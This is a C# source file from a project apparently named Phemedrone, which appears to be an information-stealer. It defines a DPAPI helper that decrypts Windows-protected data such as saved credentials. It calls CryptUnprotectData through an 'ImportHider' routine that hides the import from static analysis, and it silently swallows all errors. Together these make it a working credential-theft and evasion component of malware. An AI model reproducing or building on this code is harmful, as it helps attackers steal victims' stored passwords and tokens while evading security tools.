using System;
using System.Runtime.InteropServices;
using Phemedrone.Extensions;

namespace Phemedrone.Cryptography
{
    public class DpApi
    {
        private delegate bool CryptUnprotectData(ref DataBlob pCipherText,
            ref string pszDescription,
            ref DataBlob pEntropy,
            IntPtr pReserved,
            ref CryptprotectPromptstruct pPrompt,
            int dwFlags,
            ref DataBlob pPlainText);
        
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }
        
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }
        
        public static byte[] Decrypt(byte[] bCipher)
        {
            DataBlob pPlainText, pEntropy;
            var pCipherText = pPlainText = pEntropy = new DataBlob();

            var pPrompt = new CryptprotectPromptstruct
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };

            var sEmpty = string.Empty;

            try
            {
                try
                {
                    if (bCipher == null)
                    {
                        bCipher = new byte[0];
                    }

                    pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
                    pCipherText.cbData = bCipher.Length;
                    Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);

                }
                catch
                {
                    // ignored
                }

                var decryptDelegate =
                    ImportHider.HiddenCallResolve<CryptUnprotectData>("crypt32.dll", "CryptUnprotectData");
                decryptDelegate(ref pCipherText, ref sEmpty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);

                var bDestination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, bDestination, 0, pPlainText.cbData);
                return bDestination;

            }
            catch
            {
                // ignored
            }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(pPlainText.pbData);
                }

                if (pCipherText.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(pCipherText.pbData);
                }

                if (pEntropy.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(pEntropy.pbData);
                }
            }

            return new byte[0];
        }
    }
}